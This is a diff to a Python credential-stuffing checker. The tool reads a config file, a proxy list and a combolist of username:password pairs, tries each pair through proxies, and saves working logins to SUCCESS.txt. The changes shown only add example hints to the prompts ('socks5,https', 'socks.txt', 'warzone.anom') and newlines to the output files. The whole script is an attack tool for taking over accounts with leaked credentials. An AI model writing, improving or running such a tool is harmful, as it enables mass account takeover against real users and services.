@@ -3049,7 +3049,8 @@ bullet = f"""{k}
 |  O  ||  :  ||     T|     T|   [_   |  |  
 |     |l     ||     ||     ||     T  |  |  
 l_____j \__,_jl_____jl_____jl_____j  l__j  
-                                           
+
+
 """
 RUN = f"{pe} Config executed!"
 version = f"""
@@ -3067,19 +3068,19 @@ if __name__ == "__main__":
     ToSleep(lock,0.0)
     ToSleep(version,0.05)
     config = input(f"{lrd}[{lgn}~{lrd}]{gn} Enter Address and Config Name: {cn}")
-    Type = input(f"{lrd}[{lgn}~{lrd}]{gn} Type Proxy : {cn}")
+    Type = input(f"{lrd}[{lgn}~{lrd}]{gn} Type Proxy {yw}[{k}ex: socks5,https,etc{yw}]: {cn}")
     try:
         config = ConfigToText(config)
     except:
         print (f'{TF.ERROR}! Check the file {k}{config}')
         exit()
-    proxy = input(f'{lrd}[{lgn}~{lrd}]{gn} Address and Proxy Name: {cn}')
+    proxy = input(f'{lrd}[{lgn}~{lrd}]{gn} Address and Proxy Name {yw}[{k}ex: socks.txt{yw}]: {cn}')
     try:
         proxy = open(proxy,'r')
     except:
         print (f'{TF.ERROR}! Check the file {k}{proxy}')
         exit()
-    user = input(f'{lrd}[{lgn}~{lrd}]{gn} Address and ComboList Name: {cn}')
+    user = input(f'{lrd}[{lgn}~{lrd}]{gn} Address and ComboList Name {yw}[{k}ex: warzone.anom{yw}]: {cn}')
     try:
         user = open(user,'r')
     except:
@@ -3100,7 +3101,7 @@ if __name__ == "__main__":
             if 'SUCCESS' == run:
                 print (f"{TF.SUCCESS}=> {UserPass[0]}:{UserPass[1]}\033[1;37m")
                 with open('SUCCESS.txt','a') as suc:
-                    suc.write(str(UserPass))
+                    suc.write(f"{UserPass[0]}:{UserPass[1]}\n")
             elif 'BAN' == run:
                 print (f"{TF.BAN}=> {UserPass[0]}:{UserPass[1]}\033[1;37m")
             elif 'FAIL' == run:
@@ -3112,8 +3113,8 @@ if __name__ == "__main__":
             elif 'RETRY' == run:
                 print (f"{TF.RETRY}=> {UserPass[0]}:{UserPass[1]}\033[1;37m")
                 with open('RETRY.txt','a') as ret:
-                    ret.write(str(f"{UserPass[0]}:{UserPass[1]}"))
+                    ret.write(str(f"{UserPass[0]}:{UserPass[1]}\n"))
             elif 'CUSTOM' == run:
                 print (f"{TF.CUSTOM}=> {UserPass[0]}:{UserPass[1]}\033[1;37m")
                 with open('CUSTOM.txt','a') as cus:
-                    cus.write(str(f"{UserPass[0]}:{UserPass[1]}"))
+                    cus.write(f"{UserPass[0]}:{UserPass[1]}\n")
